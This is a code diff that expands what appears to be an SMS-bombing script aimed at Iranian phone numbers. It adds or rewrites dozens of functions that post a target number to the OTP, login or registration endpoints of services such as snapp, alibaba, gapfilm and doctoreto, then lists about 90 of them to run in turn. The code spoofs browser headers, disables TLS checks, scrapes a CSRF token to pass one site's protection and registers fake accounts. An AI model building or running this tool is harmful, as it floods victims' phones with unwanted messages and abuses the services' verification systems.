+        
+        print(f'{y}[pinket] Status: {response.status_code}{a}')
+        print(f'{y}[pinket] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(pinket) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] pinket error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] pinket exception: {e}{a}')
+        return False
+
+
+def harikashop(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        # تولید اطلاعات تصادفی
+        first_name = "کاربر"
+        last_name = "تست"
+        password = f"Test{random.randint(1000, 9999)}"
+        
+        payload = {
+            'username': formatted_phone,
+            'id_customer': '',
+            'back': 'https://harikashop.com/login?back=my-account',
+            'firstname': first_name,
+            'lastname': last_name,
+            'password': password,
+            'action': 'register',
+            'ajax': '1'
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://harikashop.com",
+            "Referer": "https://harikashop.com/login?back=my-account"
+        }
+        
+        response = requests.post(
+            "https://harikashop.com/login?back=my-account",
+            data=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[harikashop] Status: {response.status_code}{a}')
+        print(f'{y}[harikashop] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(harikashop) Registration request sent! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] harikashop error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] harikashop exception: {e}{a}')
+        return False
+
+
+def masterkala(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Authorization": "Bearer your_token_here",  # اگر نیاز به توکن دارد
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://masterkala.com",
+            "Referer": "https://masterkala.com/"
+        }
+        
+        payload = {
+            "type": "sendotp",
+            "phone": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[masterkala] Status: {response.status_code}{a}')
+        print(f'{y}[masterkala] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(masterkala) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] masterkala error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] masterkala exception: {e}{a}')
+        return False
+        
+
+
+def tebinja(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "username": formatted_phone,
+            "captchaHash": "",
+            "captchaValue": ""
+        }
+        
+        response = requests.post(
+            "https://www.tebinja.com/api/v1/users",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] tebinja Status: {response.status_code}{a}')
+        print(f'{y}[Debug] tebinja Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(tebinja) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] tebinja error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] tebinja exception: {e}{a}')
+        return False
+
+def drto(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json", 
+            "app-version": "2.0.0",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "country_id": 205,
+            "captcha": ""
+        }
+        
+        response = requests.post(
+            "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] drto Status: {response.status_code}{a}')
+        print(f'{y}[Debug] drto Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(drto) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] drto error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] drto exception: {e}{a}')
+        return False
 
 def tapsi(phone):
     try:
@@ -1646,15 +2863,43 @@ def alopeyk_safir(phone):
         print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
         return False
 
-def snap(phone):
-    snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
-    snapD = {"cellphone": phone}
+def snapp(phone):
     try:
-        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
-        return "OK" in snapR
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "cellphone": f"+98{formatted_phone}"
+        }
+        
+        response = requests.post(
+            "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] snapp Status: {response.status_code}{a}')
+        print(f'{y}[Debug] snapp Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(snapp) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] snapp error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f"{r}[!] Snap Exception: {e}")
+        print(f'{r}[!] snapp exception: {e}{a}')
         return False
+
+
 def shahrfarsh(phone):
     url = "https://shahrfarsh.com/Account/Login"
     payload = {"phoneNumber": "0" + phone.split("+98")[1]}
@@ -1711,11 +2956,105 @@ def drnext(phone):
 
 def gap(phone):
     try:
-        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])).text
-        return "OK" in gapR
+        # استخراج شماره بدون +
+        formatted_phone = phone.split("+")[1] if "+" in phone else phone.replace("+98", "").replace("+", "")
+        
+        headers = {
+            "Host": "core.gap.im",
+            "accept": "application/json, text/plain, */*",
+            "x-version": "4.5.7", 
+            "accept-language": "fa",
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+            "appversion": "web",
+            "origin": "https://web.gap.im",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://web.gap.im/",
+            "accept-encoding": "gzip, deflate, br"
+        }
+        
+        response = requests.get(
+            f"https://core.gap.im/v1/user/add.json?mobile=%2B{formatted_phone}",
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[gap] Status: {response.status_code}{a}')
+        print(f'{y}[gap] Response: {response.text}{a}')
+        
+        if response.status_code == 200 and "OK" in response.text:
+            print(f'{g}(gap) Code sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] gap error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f"{r}[!] Gap Exception: {e}")
+        print(f'{r}[!] gap exception: {e}{a}')
         return False
+
+
+def gapfilm(phone):
+    try:
+        # استخراج شماره بدون +98
+        formatted_phone = phone.split("+98")[1] if "+98" in phone else phone.replace("+98", "").replace("+", "")
+        
+        headers = {
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'fa',
+            'Browser': 'Opera',
+            'BrowserVersion': '82.0.4227.33',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/json',
+            'Host': 'core.gapfilm.ir',
+            'IP': '185.156.172.170',
+            'Origin': 'https://www.gapfilm.ir',
+            'OS': 'Linux',
+            'Referer': 'https://www.gapfilm.ir/',
+            'SourceChannel': 'GF_WebSite',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'
+        }
+        
+        payload = {
+            "Type": 3,
+            "Username": formatted_phone,
+            "SourceChannel": "GF_WebSite",
+            "SourcePlatform": "desktop",
+            "SourcePlatformAgentType": "Opera",
+            "SourcePlatformVersion": "82.0.4227.33",
+            "GiftCode": None
+        }
+        
+        response = requests.post(
+            'https://core.gapfilm.ir/api/v3.1/Account/Login',
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[gapfilm] Status: {response.status_code}{a}')
+        print(f'{y}[gapfilm] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('Code') == 1:
+                print(f'{g}(gapfilm) Code sent successfully! ✅{a}')
+                return True
+            else:
+                print(f'{r}[-] gapfilm failed: {data.get("Message", "Unknown error")}{a}')
+                return False
+        else:
+            print(f'{r}[-] gapfilm error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] gapfilm exception: {e}{a}')
+        return False
+
 
 def divar(phone):
     divarD = {"phone": phone.split("+98")[1]}
@@ -1727,13 +3066,54 @@ def divar(phone):
         return False
 
 def alibaba(phone):
-    alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
     try:
-        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', json=alibabaD ).json()
-        return alibabaR.get("result", {}).get("success")
+        # استفاده از فرمت 0912... (با صفر)
+        formatted_phone = "0" + phone.split("+98")[1] if "+98" in phone else "0" + phone.replace("+98", "")
+        
+        headers = {
+            "Host": "ws.alibaba.ir",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR",
+            "ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy",
+            "Content-Type": "application/json;charset=utf-8",
+            "Content-Length": "29",
+            "Origin": "https://www.alibaba.ir",
+            "Connection": "keep-alive",
+            "Referer": "https://www.alibaba.ir/hotel"
+        }
+        
+        payload = {"phoneNumber": formatted_phone}
+        
+        response = requests.post(
+            'https://ws.alibaba.ir/api/v3/account/mobile/otp',
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[alibaba] Status: {response.status_code}{a}')
+        print(f'{y}[alibaba] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("result", {}).get("success") == True:
+                print(f'{g}(alibaba) Code sent successfully! ✅{a}')
+                return True
+            else:
+                print(f'{r}[-] alibaba failed: {data.get("message", "Unknown error")}{a}')
+                return False
+        else:
+            print(f'{r}[-] alibaba error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f"{r}[!] AliBaba Exception: {e}")
+        print(f'{r}[!] alibaba exception: {e}{a}')
         return False
+        
 
 def mek(phone):
     try:
@@ -1790,18 +3170,46 @@ def okorosh(phone):
         print(f"{r}[!] OfoghKourosh Exception: {e}")
         return False
 
-def snapp_market(phone):
-    url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
-    params = {"cellphone": "0" + phone.split("+98")[1]}
+def smarket(phone):
     try:
-        response = post(url, params=params, timeout=5)
+        # استخراج شماره بدون +98 و اضافه کردن 0
+        formatted_phone = "0" + phone.split("+98")[1] if "+98" in phone else "0" + phone.replace("+98", "")
+        
+        headers = {
+            'accept': '*/*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'text/plain;charset=UTF-8',
+            'origin': 'https://snapp.market',
+            'referer': 'https://snapp.market/',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'
+        }
+        
+        # استفاده از GET به جای POST (همانطور که در URL مشخصه)
+        response = requests.get(
+            f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={formatted_phone}',
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[smarket] Status: {response.status_code}{a}')
+        print(f'{y}[smarket] Response: {response.text}{a}')
+        
         if response.status_code == 200:
-            print(f'{g}(Snapp Market) {a}Code Sent')
-            return True
+            data = response.json()
+            if data.get('status') == True:
+                print(f'{g}(SnapMarket) Code sent successfully! ✅{a}')
+                return True
+            else:
+                print(f'{r}[-] smarket failed: {data.get("message", "Unknown error")}{a}')
+                return False
         else:
-            print(f'{r}[-] (Snapp Market) Failed or No Response{a}')
+            print(f'{r}[-] smarket error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f'{r}[!] Snapp Market Exception: {e}{a}')
+        print(f'{r}[!] smarket exception: {e}{a}')
         return False
 
 def digikala(phone):
@@ -2134,43 +3542,62 @@ def missomister(phone):
 
 
 def candom_shop(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://candom.shop/bakala/ajax/send_code/"
-    
-    payload = {
-        "action": "bakala_send_code",
-        "phone_email": formatted_phone
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "X-CSRF-TOKEN": "7aae5b22e1",
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin": "https://candom.shop",
-        "Referer": "https://candom.shop/",
-    }
-    
+
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=10)
-        
-        print(f'{g}[+] Status: {response.status_code}{a}')
-        print(f'{g}[+] Response: {response.text}{a}')
-        
+        # پاکسازی شماره
+        if phone.startswith('+98'):
+            formatted_phone = "0" + phone[3:]
+        elif phone.startswith('98'):
+            formatted_phone = "0" + phone[2:]
+        else:
+            formatted_phone = phone
+
+        # مرحله 1: دریافت CSRF token از صفحه اصلی
+        url_main = "https://candom.shop/"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
+                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+        }
+        resp = requests.get(url_main, headers=headers, timeout=10)
+        if resp.status_code != 200:
+            print(f"[-] Candom Shop: خطا در دریافت صفحه اصلی ({resp.status_code})")
+            return False
+
+        soup = BeautifulSoup(resp.text, "html.parser")
+        token_tag = soup.find("meta", attrs={"name": "csrf-token"})
+        if not token_tag:
+            print("[-] Candom Shop: دریافت توکن ناموفق بود")
+            return False
+        csrf_token = token_tag["content"]
+
+        # مرحله 2: ارسال درخواست POST
+        post_url = "https://candom.shop/bakala/ajax/send_code/"
+        payload = {
+            "action": "bakala_send_code",
+            "phone_email": formatted_phone
+        }
+        headers_post = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
+                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-CSRF-TOKEN": csrf_token,
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://candom.shop",
+            "Referer": "https://candom.shop/",
+        }
+
+        response = requests.post(post_url, data=payload, headers=headers_post, timeout=10)
         if response.status_code == 200:
-            print(f'{g}(candom_shop) {a}Code Sent')
+            print(f"[+] Candom Shop: کد ارسال شد ({formatted_phone})")
             return True
         else:
-            print(f'{r}[-] (candom_shop) HTTP Error: {response.status_code}{a}')
+            print(f"[-] Candom Shop: خطا - کد وضعیت {response.status_code}")
             return False
-            
+
     except Exception as e:
-        print(f'{r}[!] candom_shop Exception: {e}{a}')
+        print(f"[!] Candom Shop: خطا - {e}")
         return False
-        
 
 def tapsi_food(phone):
     import requests
@@ -2247,6 +3674,49 @@ def banimode(phone):
         return False
         
 
+def iranhotel(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "api-supported-versions": "1.0",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://www.iranhotelonline.com",
+            "Referer": "https://www.iranhotelonline.com/"
+        }
+        
+        payload = {
+            "Email": "",
+            "Mobile": formatted_phone,
+            "ActivationWay": 1,
+            "Token": ""
+        }
+        
+        response = requests.post(
+            "https://www.iranhotelonline.com/api/mvc/Account/SendActivationCode",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[iranhotel] Status: {response.status_code}{a}')
+        print(f'{y}[iranhotel] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(iranhotel) Activation code sent! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] iranhotel error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] iranhotel exception: {e}{a}')
+        return False
+
 
         
 # ==========================
@@ -2254,18 +3724,16 @@ def banimode(phone):
 # ==========================
 
 services = [
-    achareh, alibaba, alldigitall, alopeyk_safir, angeliran,
-    Balad, banimode, barghman, Besparto, bimebazar,
-    bodoroj, candom_shop, Charsooq, dgshahr, digikala,
-    DigikalaJet, divar, drnext, elanza, gap,
-    ghasedak24, hajamooo, ilozi, katonikhan, katoonistore,
-    komodaa, Koohshid, mahabadperfume, malltina, mek,
-    missomister, mo7_ir, mobilex, mootanroo, mrbilit,
-    niktakala, Okala, okorosh, otaghak, paklean_call,
-    payonshoes, pindo, ragham_call, riiha, Sandalestan,
-    shahrfarsh, ShahreSandal, snap, snapp_market, snappshop,
-    sibapp, tapsi, tapsi_food, tetherland, theshoes,
-    torobpay, trip, trip_call, virgool, vitrin_shop
+    abantether, accounts1606, achareh, alibaba, alldigitall, alopeyk_safir, angeliran, arzplus, arzunex, azkivam,
+    Balad, banimode, barghman, Besparto, bimebazar, bit24, bitpin, bodoroj, booking, candom_shop,
+    Charsooq, charter118, coinkade, dastakht, dgshahr, digikala, DigikalaJet, divar, drnext, drto,
+    elanza, fadaktrains, gap, gapfilm, ghasedak24, gruccia, hajamooo, harikashop, ilozi, iranhotel,
+    instagram_send, katonikhan, katoonistore, komodaa, Koohshid, mahabadperfume, malltina, masterkala, mek, missomister,
+    mo7_ir, mobilex, mootanroo, mrbilit, mydigipay, nikpardakht, niktakala, Okala, okorosh, otaghak,
+    ompfinex, paklean_call, payaneh, payonshoes, pindo, pinket, ragham_call, raastin, riiha, Sandalestan,
+    ShahreSandal, shahrfarsh, sibapp, sibbank, sarmayex, smarket, snapp, snappshop, tabdeal, tapsi,
+    tapsi_food, tebinja, telegram_send, tetherland, theshoes, torobpay, trip, trip_call, twox, ubitex,
+    vakiljo, virgool, vitrin_shop
 ]
 
 
